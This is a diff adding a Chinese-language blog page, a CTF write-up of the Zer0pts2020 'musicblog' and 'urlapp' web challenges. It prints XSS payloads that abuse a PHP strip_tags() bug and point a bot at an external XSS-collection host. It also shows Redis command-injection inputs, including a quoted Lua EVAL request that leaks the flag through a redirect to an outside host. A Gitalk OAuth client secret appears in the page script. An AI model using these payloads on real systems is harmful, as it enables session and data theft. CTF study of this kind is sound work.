@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    Zer0pts2020 Writeup |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-Zer0pts2020-musicblog" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Zer0pts2020 Writeup
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/04/30/Zer0pts2020-musicblog/" class="article-date">
+  <time datetime="2020-04-30T15:13:12.000Z" itemprop="datePublished">2020-04-30</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>strip_tags()函数bug</p>
+<p>记录复现Zer0pts2020部分题目</p>
+<a id="more"></a>
+
+<h1 id="0x01-musicblog"><a href="#0x01-musicblog" class="headerlink" title="0x01 musicblog"></a>0x01 musicblog</h1><p>题目给了源码，目录结构如下</p>
+<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430231714733.png" alt="image-20200430231714733" style="zoom:200%;">
+
+<p>测试网站可以注册、登录、发布blog等。</p>
+<p>看worker.js源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">'zer0pts&#123;&lt;censored&gt;&#125;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">'networkidle0'</span>,</span><br><span class="line">            timeout: <span class="number">10</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> page.click(<span class="string">'#like'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br></pre></td></tr></table></figure>
+
+<p>这里crawl函数会将flag放到User-Agent中，导航到url，然后点击id为like的标签。所以可以确定为xss了。</p>
+<p>然后阅读源码，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'util.php'</span>;</span><br><span class="line"></span><br><span class="line">$nonce = get_nonce();</span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'nonce-$&#123;nonce&#125;' 'strict-dynamic'; base-uri 'none'; trusted-types"</span>);</span><br><span class="line">header(<span class="string">'X-Frame-Options: DENY'</span>);</span><br><span class="line">header(<span class="string">'X-XSS-Protection: 1; mode=block'</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>
+
+<p>设置了csp，无法跨域请求，且js必须具有$nonce值才能被加载执行，然后寻找可以触发xss的地方，bot会点击id为like的标签，在访问post.php?id=xx时</p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430233401847.png" alt="image-20200430233401847"></p>
+<p>具有like的标签，可知bot会定时访问post.php页面，在post时</p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430233540707.png" alt="image-20200430233540707"></p>
+<p>会将<code>[[URL]]</code>转换成<code>&lt;audio src=&quot;URL&quot;&gt;&lt;/audio&gt;</code>,并且点击上图框中选项，bot会check your post,确定xss。</p>
+<p>然后看源码里对<code>[[URL]]</code>的处理，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// [[URL]] → &lt;audio src="URL"&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $str = preg_replace(<span class="string">'/\[\[(.+?)\]\]/'</span>, <span class="string">'&lt;audio controls src="\\1"&gt;&lt;/audio&gt;'</span>, $str);</span><br><span class="line">  $str = strip_tags($str, <span class="string">'&lt;audio&gt;'</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过查找资料可以找到strip_tags()函数有bug。</p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430233936071.png" alt="image-20200430233936071"></p>
+<p><a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a></p>
+<p>也就是不会过滤<code>&lt;a/udio&gt;</code>，并且<code>&lt;a/udio&gt;</code>会作为 超链接<code>&lt;a&gt;</code>被解析，而超链接的跳转是不受<strong>CSP限制</strong>的。</p>
+<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430234206184.png" alt="image-20200430234206184" style="zoom:200%;">
+
+<p>然后在post时将content设置为如下payload</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/udio  href=<span class="string">"http://xss.buuoj.cn/index.php?do=api&amp;id=UrvHLW"</span> id=like&gt;x&lt;<span class="regexp">/a/u</span>dio&gt;</span><br><span class="line">or</span><br><span class="line">[[<span class="string">"&gt;&lt;/audio&gt;&lt;a/udio href="</span>http:<span class="comment">//xss.buuoj.cn/index.php?do=api&amp;id=UrvHLW" id=like&gt;test&lt;/a/udio&gt;&lt;audio a="]]</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501000509269.png" alt="image-20200501000509269"></p>
+<p>可以看到已经添加了到xss平台的标签。</p>
+<ul>
+<li>第一个payload</li>
+</ul>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501000449539.png" alt="image-20200501000449539"></p>
+<ul>
+<li>第二个payload</li>
+</ul>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430235654042.png" alt="image-20200430235654042"></p>
+<p>然后可得flag。</p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430235007637.png" alt="image-20200430235007637"></p>
+<h1 id="0x02-urlapp"><a href="#0x02-urlapp" class="headerlink" title="0x02 urlapp"></a>0x02 urlapp</h1><p>题目源码</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'uri'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">()</span></span></span><br><span class="line">  sock = TCPSocket.open(<span class="string">"redis"</span>, <span class="number">6379</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> ping(sock) <span class="keyword">then</span></span><br><span class="line">    exit</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sock</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(sock, cmd)</span></span></span><br><span class="line">  sock.write(cmd + <span class="string">"\r\n"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv</span><span class="params">(sock)</span></span></span><br><span class="line">  data = sock.gets</span><br><span class="line">  <span class="keyword">if</span> data == <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">  <span class="keyword">elsif</span> data[<span class="number">0</span>] == <span class="string">"+"</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> data[<span class="number">1</span>..-<span class="number">1</span>].strip</span><br><span class="line">  <span class="keyword">elsif</span> data[<span class="number">0</span>] == <span class="string">"$"</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">"$-1\r\n"</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> sock.gets.strip</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping</span><span class="params">(sock)</span></span></span><br><span class="line">  query(sock, <span class="string">"ping"</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">"PONG"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(sock, key, value)</span></span></span><br><span class="line">  query(sock, <span class="string">"SET <span class="subst">#&#123;key&#125;</span> <span class="subst">#&#123;value&#125;</span>"</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">"OK"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(sock, key)</span></span></span><br><span class="line">  query(sock, <span class="string">"GET <span class="subst">#&#123;key&#125;</span>"</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">before <span class="keyword">do</span></span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, <span class="string">"flag"</span>, File.read(<span class="string">"flag.txt"</span>).strip)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> params.has_key?(<span class="symbol">:q</span>) <span class="keyword">then</span></span><br><span class="line">    q = params[<span class="symbol">:q</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (q =~ <span class="regexp">/^[0-9a-f]&#123;16&#125;$/</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    sock = connect()</span><br><span class="line">    url = get(sock, q)</span><br><span class="line">    redirect url</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  send_file <span class="string">'index.html'</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> params.has_key?(<span class="symbol">:url</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  url = params[<span class="symbol">:url</span>]</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> (url =~ URI.regexp) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  key = Random.urandom(<span class="number">8</span>).unpack(<span class="string">"H*"</span>)[<span class="number">0</span>]</span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, key, url)</span><br><span class="line"></span><br><span class="line">  <span class="string">"<span class="subst">#&#123;request.host&#125;</span>:<span class="subst">#&#123;request.port&#125;</span>/?q=<span class="subst">#&#123;key&#125;</span>"</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>审计源码后可以得到代码的逻辑，首先会把flag.txt文件的内容，保存到redis数据库中，对应的键为flag，然后有个改变url长度的功能，post传入一个url，然后检测url，之后将url存储到redis数据库中，对应的键为随机生成的8位字符的十六进制，然后输出对应的键，</p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501130254421.png" alt="image-20200501130254421"></p>
+<p>然后访问上图框中的地址，服务端会跳转到上面的链接。</p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501133518039.png" alt="image-20200501133518039"></p>
+<p>服务端首先检测q，是否为16位[0-9a-f]的字符，</p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501133638134.png" alt="image-20200501133638134"></p>
+<p>然后查q对应的值，然后重定向到url。</p>
+<p>redirect:</p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501135806818.png" alt="image-20200501135806818"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">rename-command AUTH &quot;&quot;</span><br><span class="line">rename-command RENAME &quot;&quot;</span><br><span class="line">rename-command RENAMENX &quot;&quot;</span><br><span class="line">rename-command FLUSHDB &quot;&quot;</span><br><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command MULTI &quot;&quot;</span><br><span class="line">rename-command EXEC &quot;&quot;</span><br><span class="line">rename-command DISCARD &quot;&quot;</span><br><span class="line">rename-command WATCH &quot;&quot;</span><br><span class="line">rename-command UNWATCH &quot;&quot;</span><br><span class="line">rename-command SUBSCRIBE &quot;&quot;</span><br><span class="line">rename-command UNSUBSCRIBE &quot;&quot;</span><br><span class="line">rename-command PUBLISH &quot;&quot;</span><br><span class="line">rename-command SAVE &quot;&quot;</span><br><span class="line">rename-command BGSAVE &quot;&quot;</span><br><span class="line">rename-command LASTSAVE &quot;&quot;</span><br><span class="line">rename-command SHUTDOWN &quot;&quot;</span><br><span class="line">rename-command BGREWRITEAOF &quot;&quot;</span><br><span class="line">rename-command INFO &quot;&quot;</span><br><span class="line">rename-command MONITOR &quot;&quot;</span><br><span class="line">rename-command SLAVEOF &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command CLIENT &quot;&quot;</span><br><span class="line">rename-command CLUSTER &quot;&quot;</span><br><span class="line">rename-command DEBUG &quot;&quot;</span><br><span class="line">rename-command EVAL &quot;&quot;</span><br><span class="line">rename-command EVALSHA &quot;&quot;</span><br><span class="line">rename-command PSUBSCRIBE &quot;&quot;</span><br><span class="line">rename-command PUBSUB &quot;&quot;</span><br><span class="line">rename-command READONLY &quot;&quot;</span><br><span class="line">rename-command READWRITE &quot;&quot;</span><br><span class="line">rename-command SCRIPT &quot;&quot;</span><br><span class="line">rename-command REPLICAOF &quot;&quot;</span><br><span class="line">rename-command SYNC &quot;&quot;</span><br><span class="line">rename-command PSYNC &quot;&quot;</span><br><span class="line">rename-command WAIT &quot;&quot;</span><br><span class="line">rename-command LATENCY &quot;&quot;</span><br><span class="line">rename-command MEMORY &quot;&quot;</span><br><span class="line">rename-command MODULE &quot;&quot;</span><br><span class="line">rename-command MIGRATE &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后在redis的配置文件里禁了上面的命令，理清代码逻辑后我们可以清楚我们的攻击思路，其实就是通过获取redis数据库中键为flag对应的值。</p>
+<ul>
+<li>方法一</li>
+</ul>
+<p>通过BITOP<a href="https://redis.io/commands/bitop" target="_blank" rel="noopener">命令</a>和BITFIELD<a href="https://redis.io/commands/bitfield" target="_blank" rel="noopener">命令</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;</span><br><span class="line">BITOP AND 2f2f2f2f2f2f2f2b flag flag</span><br></pre></td></tr></table></figure>
+
+<p>这样设置，然后访问q=2f2f2f2f2f2f2f2b，返回404，然后查找原因得知</p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501133638134.png" alt="image-20200501133638134"></p>
+<p>是这里redirect的原因，然后参考</p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501141636854.png" alt="image-20200501141636854"></p>
+<p>这里，需要把url变成带有?的链接。</p>
+<p>BITFIELD命令可以设置指定位域的值。</p>
+<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501141937654.png" alt="image-20200501141937654" style="zoom:150%;">
+
+<p>可以设置任意位。</p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501140017042.png" alt="image-20200501140017042"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;</span><br><span class="line">BITOP AND 2f2f2f2f2f2f2f2b flag flag</span><br><span class="line">BITFIELD 2f2f2f2f2f2f2f2b SET u8 #4 63</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501140158217.png" alt="image-20200501140158217"></p>
+<ul>
+<li>方法二</li>
+</ul>
+<p>通过BITOP命令和SETBIT<a href="https://redis.io/commands/setbit" target="_blank" rel="noopener">命令</a></p>
+<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501140628667.png" alt="image-20200501140628667" style="zoom:200%;">
+
+<p>flag{}与1异或第一位为W</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">W	0101 0111</span><br><span class="line">? 	0011 1111</span><br><span class="line">需要修改 第 1、2、4位。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501140342693.png" alt="image-20200501140342693"></p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501142107776.png" alt="image-20200501142107776"></p>
+<ul>
+<li>方法三</li>
+</ul>
+<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501142904135.png" alt="image-20200501142904135" style="zoom:150%;">
+
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request 1</span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 3.112.201.75:8004</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 117</span><br><span class="line"></span><br><span class="line">url&#x3D;http:&#x2F;&#x2F;rwx.kr</span><br><span class="line">eval &quot;redis.call(&#39;set&#39;,&#39;e41cf0f94e050661&#39;,&#39;http:&#x2F;&#x2F;rwx.kr?&#39;..redis.call(&#39;get&#39;,&#39;flag&#39;));return 1;&quot; 0</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Request 2</span><br><span class="line">GET &#x2F;?q&#x3D;e41cf0f94e050661 HTTP&#x2F;1.1</span><br><span class="line">Host: 3.112.201.75:8004</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 302 Found</span><br><span class="line">Content-Type: text&#x2F;html;charset&#x3D;utf-8</span><br><span class="line">Location: http:&#x2F;&#x2F;rwx.kr?zer0pts&#123;sh0rt_t0_10ng_10ng_t0_sh0rt&#125;</span><br><span class="line">Content-Length: 0</span><br><span class="line">X-Xss-Protection: 1; mode&#x3D;block</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Server: WEBrick&#x2F;1.6.0 (Ruby&#x2F;2.7.0&#x2F;2019-12-25)</span><br><span class="line">Date: Sun, 08 Mar 2020 21:40:28 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.rwx.kr/zer0pts-CTF-2020/#435pts-urlapp" target="_blank" rel="noopener">https://blog.rwx.kr/zer0pts-CTF-2020/#435pts-urlapp</a>未复现成功</p>
+</blockquote>
+<p>参考：</p>
+<p><a href="https://blog.rwx.kr/zer0pts-CTF-2020/#435pts-urlapp" target="_blank" rel="noopener">https://blog.rwx.kr/zer0pts-CTF-2020/#435pts-urlapp</a></p>
+<p><a href="https://www.anquanke.com/post/id/200927#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200927#h3-4</a></p>
+<p><a href="https://gitlab.com/zer0pts/zer0pts-ctf-2020/" target="_blank" rel="noopener">https://gitlab.com/zer0pts/zer0pts-ctf-2020/</a></p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/04/30/Zer0pts2020-musicblog/" target="_blank" title="Zer0pts2020 Writeup">http://mount4in.github.io/2020/04/30/Zer0pts2020-musicblog/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/04/30/Zer0pts2020-musicblog/" data-id="clg20p5v1001m14uv8szm2rht"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            2020年安恒四月月赛
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/04/26/NPUCTF-WP/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">NPUCTF_WP</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
